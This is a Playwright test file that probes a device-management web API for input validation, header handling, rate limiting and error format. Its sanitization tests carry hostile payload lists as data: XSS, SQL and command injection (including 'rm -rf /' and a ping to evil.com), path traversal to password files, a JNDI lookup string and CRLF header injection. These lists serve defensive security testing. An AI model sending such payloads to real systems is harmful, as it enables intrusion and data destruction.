// @ts-check
import { test, expect } from '@playwright/test';
import { expectOk } from './helpers';

const BASE = process.env.PLAYWRIGHT_BASE_URL || 'http://127.0.0.1:8080';

async function api(context, path, init) {
	return await context.fetch(BASE + path, init);
}

async function createAuthenticatedUser(request, role = 'ENI-SUPERUSER') {
	const username = `api_user_${Date.now()}_${Math.random()}`;
	const password = 'TestPass123!';
	
	await api(request, '/api/auth/register', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		data: { username, password, role }
	});
	
	await api(request, '/api/auth/login', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		data: { username, password }
	});
	
	return { username, password, role };
}

test.describe('Comprehensive API Validation Tests', () => {
	
	test.describe('HTTP Methods Validation', () => {
		test('should reject unsupported HTTP methods', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const endpoints = [
				'/api/auth/login',
				'/api/config',
				'/api/settings',
				'/api/devices'
			];
			
			const unsupportedMethods = ['PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT'];
			
			for (const endpoint of endpoints) {
				for (const method of unsupportedMethods) {
					const res = await api(request, endpoint, { method });
					
					// Should return method not allowed or not found
					expect([404, 405, 501]).toContain(res.status());
				}
			}
		});

		test('should handle GET requests to POST-only endpoints', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const postOnlyEndpoints = [
				'/api/auth/register',
				'/api/auth/login',
				'/api/auth/logout',
				'/api/ops/get-config',
				'/api/ops/commit-config',
				'/api/tls/reload',
				'/api/tls/upload/pfx',
				'/api/tls/upload/pem',
				'/api/ssh-keys/upload'
			];
			
			for (const endpoint of postOnlyEndpoints) {
				const res = await api(request, endpoint, { method: 'GET' });
				
				// Should return method not allowed or not found
				expect([404, 405]).toContain(res.status());
			}
		});

		test('should handle POST requests to GET-only endpoints', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const getOnlyEndpoints = [
				'/api/auth/me',
				'/api/config',
				'/api/settings',
				'/api/devices',
				'/api/ops/logs',
				'/api/tls/status',
				'/api/ssh-keys/status',
				'/healthz'
			];
			
			for (const endpoint of getOnlyEndpoints) {
				const res = await api(request, endpoint, {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {}
				});
				
				// Should return method not allowed or handle gracefully
				expect([200, 404, 405]).toContain(res.status());
			}
		});
	});

	test.describe('Content-Type Validation', () => {
		test('should handle missing Content-Type header', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
			});
			
			// Should handle missing content-type gracefully
			expect([200, 201, 400, 415]).toContain(res.status());
		});

		test('should handle incorrect Content-Type header', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const incorrectTypes = [
				'text/plain',
				'application/xml',
				'multipart/form-data',
				'application/octet-stream',
				'text/html'
			];
			
			for (const contentType of incorrectTypes) {
				const res = await api(request, '/api/auth/register', {
					method: 'POST',
					headers: { 'Content-Type': contentType },
					body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
				});
				
				// Should handle incorrect content-type
				expect([200, 201, 400, 415]).toContain(res.status());
			}
		});

		test('should handle malformed Content-Type header', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const malformedTypes = [
				'application/',
				'application',
				'/json',
				'application/json;',
				'application/json; charset=',
				'invalid-type'
			];
			
			for (const contentType of malformedTypes) {
				const res = await api(request, '/api/auth/register', {
					method: 'POST',
					headers: { 'Content-Type': contentType },
					body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
				});
				
				// Should handle malformed content-type
				expect([200, 201, 400, 415]).toContain(res.status());
			}
		});

		test('should handle Content-Type with charset', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const charsets = [
				'application/json; charset=utf-8',
				'application/json; charset=UTF-8',
				'application/json; charset=iso-8859-1',
				'application/json;charset=utf-8'
			];
			
			for (const contentType of charsets) {
				const res = await api(request, '/api/auth/register', {
					method: 'POST',
					headers: { 'Content-Type': contentType },
					body: JSON.stringify({ username: `test_${Date.now()}`, password: 'test', role: 'ENI-USER' })
				});
				
				// Should handle charset specifications
				expect([201, 400, 409]).toContain(res.status());
			}
		});
	});

	test.describe('Request Body Validation', () => {
		test('should handle empty request body', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const endpoints = [
				{ path: '/api/auth/register', method: 'POST' },
				{ path: '/api/auth/login', method: 'POST' },
				{ path: '/api/config', method: 'PUT' },
				{ path: '/api/settings', method: 'PUT' },
				{ path: '/api/devices', method: 'POST' }
			];
			
			for (const endpoint of endpoints) {
				const res = await api(request, endpoint.path, {
					method: endpoint.method,
					headers: { 'Content-Type': 'application/json' },
					body: ''
				});
				
				// Should handle empty body gracefully
				expect([200, 400, 422]).toContain(res.status());
			}
		});

		test('should handle null request body', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const res = await api(request, '/api/config', {
				method: 'PUT',
				headers: { 'Content-Type': 'application/json' },
				body: null
			});
			
			// Should handle null body
			expect([200, 400]).toContain(res.status());
		});

		test('should handle malformed JSON', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const malformedJson = [
				'{"invalid": json}',
				'{invalid: "json"}',
				'{"missing": "quote}',
				'{"trailing": "comma",}',
				'{',
				'}',
				'not json at all',
				'{"nested": {"malformed": json}}',
				'{"unicode": "\\uXXXX"}'
			];
			
			for (const json of malformedJson) {
				const res = await api(request, '/api/auth/register', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: json
				});
				
				// Should handle malformed JSON
				expect([400, 422]).toContain(res.status());
			}
		});

		test('should handle very large request bodies', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			// Create large JSON payload
			const largeData = {
				username: 'test_user',
				password: 'test_password',
				role: 'ENI-USER',
				large_field: 'A'.repeat(1000000) // 1MB of data
			};
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(largeData)
			});
			
			// Should handle large payloads
			expect([201, 400, 413, 422]).toContain(res.status());
		});

		test('should handle deeply nested JSON', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			// Create deeply nested object
			let nested = { value: 'deep' };
			for (let i = 0; i < 100; i++) {
				nested = { level: i, nested: nested };
			}
			
			const deepData = {
				username: 'test_user',
				password: 'test_password',
				role: 'ENI-USER',
				deep: nested
			};
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(deepData)
			});
			
			// Should handle deeply nested JSON
			expect([201, 400, 413, 422]).toContain(res.status());
		});

		test('should handle special characters in JSON', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const specialChars = {
				username: 'test_user_special',
				password: 'test_password_123!@#$%^&*()_+-=[]{}|;:,.<>?',
				role: 'ENI-USER',
				special: '特殊字符 🌟 \n\t\r\b\f\\"\\/'
			};
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(specialChars)
			});
			
			// Should handle special characters
			expect([201, 400, 409, 422]).toContain(res.status());
		});
	});

	test.describe('URL Parameter Validation', () => {
		test('should handle missing required parameters', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const res = await api(request, '/api/devices', {
				method: 'DELETE'
				// Missing required 'id' parameter
			});
			
			expect(res.status()).toBe(400);
			const error = await res.json();
			expect(error.error).toBe('id query parameter is required');
		});

		test('should handle invalid parameter types', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const invalidIds = [
				'not_a_number',
				'1.5',
				'null',
				'undefined',
				'true',
				'false',
				'[]',
				'{}',
				'',
				' ',
				'NaN',
				'Infinity'
			];
			
			for (const id of invalidIds) {
				const res = await api(request, `/api/devices?id=${encodeURIComponent(id)}`, {
					method: 'DELETE'
				});
				
				expect(res.status()).toBe(400);
			}
		});

		test('should handle very large parameter values', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const largeId = '9'.repeat(1000);
			
			const res = await api(request, `/api/devices?id=${largeId}`, {
				method: 'DELETE'
			});
			
			// Should handle large parameter values
			expect([400, 404]).toContain(res.status());
		});

		test('should handle special characters in parameters', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const specialChars = [
				'<script>',
				'%3Cscript%3E',
				'../../../etc/passwd',
				'${jndi:ldap://evil.com}',
				'SELECT * FROM users',
				'1; DROP TABLE users;',
				'null',
				'undefined'
			];
			
			for (const char of specialChars) {
				const res = await api(request, `/api/devices?type=${encodeURIComponent(char)}`);
				
				// Should handle special characters safely
				expect(res.status()).toBe(200);
				const devices = await res.json();
				expect(Array.isArray(devices)).toBe(true);
			}
		});

		test('should handle Unicode in parameters', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const unicodeValues = [
				'测试',
				'тест',
				'テスト',
				'🚀🌟💻',
				'café',
				'naïve'
			];
			
			for (const unicode of unicodeValues) {
				const res = await api(request, `/api/devices?type=${encodeURIComponent(unicode)}`);
				
				// Should handle Unicode safely
				expect(res.status()).toBe(200);
			}
		});
	});

	test.describe('Header Validation', () => {
		test('should handle missing headers', async ({ request }) => {
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
				// No headers
			});
			
			// Should handle missing headers
			expect([201, 400, 415]).toContain(res.status());
		});

		test('should handle malformed headers', async ({ request }) => {
			const malformedHeaders = {
				'Content-Type': 'application/json\r\nX-Injected: malicious',
				'Authorization': 'Bearer \r\nX-Injected: header',
				'X-Custom': 'value\nwith\nnewlines'
			};
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: malformedHeaders,
				body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
			});
			
			// Should handle malformed headers safely
			expect([201, 400, 415]).toContain(res.status());
		});

		test('should handle very long header values', async ({ request }) => {
			const longValue = 'A'.repeat(10000);
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
					'X-Long-Header': longValue
				},
				body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
			});
			
			// Should handle long headers
			expect([201, 400, 413, 431]).toContain(res.status());
		});

		test('should handle many headers', async ({ request }) => {
			const manyHeaders = { 'Content-Type': 'application/json' };
			
			// Add many custom headers
			for (let i = 0; i < 100; i++) {
				manyHeaders[`X-Custom-${i}`] = `value-${i}`;
			}
			
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: manyHeaders,
				body: JSON.stringify({ username: 'test', password: 'test', role: 'ENI-USER' })
			});
			
			// Should handle many headers
			expect([201, 400, 413, 431]).toContain(res.status());
		});

		test('should handle case sensitivity in headers', async ({ request }) => {
			const caseVariations = [
				'content-type',
				'Content-Type',
				'CONTENT-TYPE',
				'Content-type',
				'content-Type'
			];
			
			for (const header of caseVariations) {
				const res = await api(request, '/api/auth/register', {
					method: 'POST',
					headers: { [header]: 'application/json' },
					body: JSON.stringify({ username: `test_${Date.now()}`, password: 'test', role: 'ENI-USER' })
				});
				
				// Should handle case variations
				expect([201, 400, 409, 415]).toContain(res.status());
			}
		});
	});

	test.describe('Rate Limiting and Abuse Prevention', () => {
		test('should handle rapid sequential requests', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const promises = [];
			for (let i = 0; i < 50; i++) {
				promises.push(api(request, '/api/settings'));
			}
			
			const results = await Promise.all(promises);
			
			// All requests should complete (may be rate limited)
			for (const res of results) {
				expect([200, 429, 503]).toContain(res.status());
			}
		});

		test('should handle concurrent requests', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const concurrentRequests = [];
			for (let i = 0; i < 20; i++) {
				concurrentRequests.push(
					api(request, '/api/devices', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						data: {
							name: `Concurrent Device ${i}`,
							host: `192.168.1.${100 + i}`,
							port: 22,
							type: 'ENI_SERVER',
							active: true
						}
					})
				);
			}
			
			const results = await Promise.all(concurrentRequests);
			
			// Should handle concurrent requests
			let successCount = 0;
			for (const res of results) {
				if (res.status() === 201) successCount++;
				expect([201, 400, 429, 500]).toContain(res.status());
			}
			
			// At least some should succeed
			expect(successCount).toBeGreaterThan(0);
		});

		test('should handle repeated failed login attempts', async ({ request }) => {
			const username = `failed_login_${Date.now()}`;
			
			// Register user first
			await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username, password: 'correct_password', role: 'ENI-USER' }
			});
			
			// Attempt multiple failed logins
			const failedAttempts = [];
			for (let i = 0; i < 10; i++) {
				failedAttempts.push(
					api(request, '/api/auth/login', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						data: { username, password: 'wrong_password' }
					})
				);
			}
			
			const results = await Promise.all(failedAttempts);
			
			// Should handle repeated failures (may implement rate limiting)
			for (const res of results) {
				expect([401, 429]).toContain(res.status());
			}
		});
	});

	test.describe('Error Response Validation', () => {
		test('should return consistent error format', async ({ request }) => {
			const res = await api(request, '/api/auth/register', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: {} // Missing required fields
			});
			
			expect(res.status()).toBe(400);
			const error = await res.json();
			
			// Should have consistent error format
			expect(error.error).toBeDefined();
			expect(typeof error.error).toBe('string');
		});

		test('should not expose sensitive information in errors', async ({ request }) => {
			const res = await api(request, '/api/auth/login', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				data: { username: 'nonexistent', password: 'password' }
			});
			
			expect(res.status()).toBe(401);
			const error = await res.json();
			
			// Should not expose sensitive information
			expect(error.error).not.toContain('password');
			expect(error.error).not.toContain('hash');
			expect(error.error).not.toContain('database');
			expect(error.error).not.toContain('sql');
			expect(error.error).not.toContain('stack');
		});

		test('should handle errors consistently across endpoints', async ({ request }) => {
			const errorEndpoints = [
				{ path: '/api/auth/login', method: 'POST', data: {} },
				{ path: '/api/devices', method: 'POST', data: {} },
				{ path: '/api/devices', method: 'DELETE' },
				{ path: '/api/config', method: 'PUT', data: { invalid: 'data' } }
			];
			
			for (const endpoint of errorEndpoints) {
				const res = await api(request, endpoint.path, {
					method: endpoint.method,
					headers: { 'Content-Type': 'application/json' },
					data: endpoint.data
				});
				
				if (res.status() >= 400) {
					const error = await res.json();
					
					// Should have consistent error structure
					expect(error).toBeDefined();
					expect(typeof error).toBe('object');
					
					// Should have error field or fieldErrors
					expect(error.error || error.fieldErrors).toBeDefined();
				}
			}
		});
	});

	test.describe('Input Sanitization', () => {
		test('should sanitize HTML in input fields', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const htmlInputs = [
				'<script>alert("xss")</script>',
				'<img src="x" onerror="alert(1)">',
				'<svg onload="alert(1)">',
				'javascript:alert(1)',
				'<iframe src="javascript:alert(1)"></iframe>'
			];
			
			for (const html of htmlInputs) {
				const res = await api(request, '/api/devices', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {
						name: html,
						host: '192.168.1.100',
						port: 22,
						type: 'ENI_SERVER',
						active: true
					}
				});
				
				if (res.status() === 201) {
					const device = await res.json();
					
					// Should not contain executable HTML
					expect(device.name).not.toContain('<script>');
					expect(device.name).not.toContain('javascript:');
					expect(device.name).not.toContain('onerror=');
					expect(device.name).not.toContain('onload=');
				}
			}
		});

		test('should handle SQL injection attempts', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const sqlInjections = [
				"'; DROP TABLE users; --",
				"' OR '1'='1",
				"1; DELETE FROM devices; --",
				"' UNION SELECT * FROM users --",
				"admin'--",
				"' OR 1=1 --"
			];
			
			for (const sql of sqlInjections) {
				const res = await api(request, '/api/devices', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {
						name: sql,
						host: '192.168.1.100',
						port: 22,
						type: 'ENI_SERVER',
						active: true
					}
				});
				
				// Should handle SQL injection attempts safely
				expect([201, 400]).toContain(res.status());
				
				if (res.status() === 201) {
					const device = await res.json();
					// Device should be created with sanitized name
					expect(device.name).toBeDefined();
				}
			}
		});

		test('should handle command injection attempts', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const commandInjections = [
				'; ls -la',
				'&& rm -rf /',
				'| cat /etc/passwd',
				'`whoami`',
				'$(id)',
				'; ping -c 1 evil.com'
			];
			
			for (const cmd of commandInjections) {
				const res = await api(request, '/api/devices', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					data: {
						name: `Device ${cmd}`,
						host: '192.168.1.100',
						port: 22,
						type: 'ENI_SERVER',
						active: true
					}
				});
				
				// Should handle command injection attempts safely
				expect([201, 400]).toContain(res.status());
			}
		});

		test('should handle path traversal attempts', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const pathTraversals = [
				'../../../etc/passwd',
				'..\\..\\..\\windows\\system32\\config\\sam',
				'....//....//....//etc/passwd',
				'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
				'..%252f..%252f..%252fetc%252fpasswd'
			];
			
			for (const path of pathTraversals) {
				const res = await api(request, '/api/settings', {
					method: 'PUT',
					headers: { 'Content-Type': 'application/json' },
					data: {
						linux_source_path: path,
						rpi_destination_path: '/safe/path'
					}
				});
				
				// Should handle path traversal attempts
				expect([200, 400]).toContain(res.status());
				
				if (res.status() === 200) {
					const settings = await res.json();
					// Path should be sanitized or rejected
					expect(settings.linux_source_path).toBeDefined();
				}
			}
		});
	});

	test.describe('Response Validation', () => {
		test('should return proper HTTP status codes', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const testCases = [
				{ path: '/healthz', method: 'GET', expectedStatus: 200 },
				{ path: '/api/auth/me', method: 'GET', expectedStatus: 200 },
				{ path: '/api/settings', method: 'GET', expectedStatus: 200 },
				{ path: '/api/config', method: 'GET', expectedStatus: 200 },
				{ path: '/api/devices', method: 'GET', expectedStatus: 200 }
			];
			
			for (const testCase of testCases) {
				const res = await api(request, testCase.path, {
					method: testCase.method
				});
				
				expect(res.status()).toBe(testCase.expectedStatus);
			}
		});

		test('should return proper Content-Type headers', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const jsonEndpoints = [
				'/api/auth/me',
				'/api/settings',
				'/api/config',
				'/api/devices',
				'/healthz'
			];
			
			for (const endpoint of jsonEndpoints) {
				const res = await api(request, endpoint);
				
				if (res.status() === 200) {
					const contentType = res.headers()['content-type'];
					expect(contentType).toContain('application/json');
				}
			}
		});

		test('should return valid JSON responses', async ({ request }) => {
			await createAuthenticatedUser(request);
			
			const endpoints = [
				'/api/auth/me',
				'/api/settings',
				'/api/config',
				'/api/devices',
				'/healthz'
			];
			
			for (const endpoint of endpoints) {
				const res = await api(request, endpoint);
				
				if (res.status() === 200) {
					// Should be valid JSON
					const json = await res.json();
					expect(json).toBeDefined();
					expect(typeof json).toBe('object');
				}
			}
		});
	});
});